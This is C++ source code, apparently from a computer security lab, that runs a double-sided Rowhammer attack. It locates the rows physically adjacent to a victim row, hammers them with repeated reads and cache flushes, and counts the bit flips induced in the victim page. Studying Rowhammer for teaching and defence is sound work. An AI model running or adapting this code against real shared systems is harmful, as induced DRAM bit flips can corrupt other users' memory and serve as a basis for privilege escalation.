#include "../shared.hh"
#include "../params.hh"
#include "../util.hh"

uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1, uint64_t attacker_virt_addr_2) {

    // prime
    uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
    memset(vict_virt_addr_ptr, 0xFF, PAGE_SIZE);
  
    int num_reads = HAMMERS_PER_ITER;

    while (num_reads-- > 0 ) {
        asm volatile(
            "mov (%0), %%rax\n\t"
            "mov (%1), %%rax\n\t"
            "clflush (%0)\n\t"
            "clflush (%1)\n\t"
            :
            : "r" (attacker_virt_addr_1), "r" (attacker_virt_addr_2)
            : "rax"
        );
    }
    clflush(vict_virt_addr);
    uint32_t number_of_bitflips_in_target = 0;
    for (uint32_t index = 0; index < PAGE_SIZE; index++) {
        if (vict_virt_addr_ptr[index] != 0xFF) {
            number_of_bitflips_in_target++;
        }
    }
    return number_of_bitflips_in_target; 
}

uint64_t get_dram_address(uint64_t row, int bank, uint64_t col) {
    int bank_xor_bits = (row & 0x7) ^ bank;
    return (row << 16) | (bank_xor_bits << 13) | col;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    uint64_t mem_size = 1.8 * BUFFER_SIZE_MB;
    allocated_mem = allocate_pages(mem_size);
    setup_PPN_VPN_map(allocated_mem, mem_size);

    uint64_t victim, attacker_1, attacker_2;
    int tries = 1000;
    while (tries-- > 0) {
        victim = (uint64_t)((uint8_t *)allocated_mem + ROW_SIZE * (rand() % (mem_size / PAGE_SIZE)));
        uint64_t phys_addr = virt_to_phys(victim);
        uint64_t row = phys_addr >> 16;
        uint64_t col = phys_addr & 0x1fff; // 13 bits 
        int bank_xor_bits = (phys_addr >> 13) & 0x7;
        int bank = bank_xor_bits ^ (row & 0x7);

        attacker_1 = phys_to_virt(get_dram_address(row + 1, bank, col));
        attacker_2 = phys_to_virt(get_dram_address(row - 1, bank, col));
        if (attacker_1 != 0 && attacker_2 != 0) break;
    }

    if (tries <= 0) {
        printf("Could not get test address. Try again\n");
        exit(1);
    }

    uint32_t num_bit_flips = hammer_addresses(victim, attacker_1, attacker_2);
    uint64_t x = virt_to_phys(victim);
    uint64_t a = virt_to_phys(attacker_1);
    uint64_t b = virt_to_phys(attacker_2);
    printf("victim: %s\t%ld (phys)\n", int_to_binary(x), x);
    printf("attacker 1: %s\t%ld (phys)\n", int_to_binary(a), a);
    printf("attacker 2: %s\t%ld (phys)\n", int_to_binary(b), b);
    printf("Bit flips found: %d\n", num_bit_flips);
}

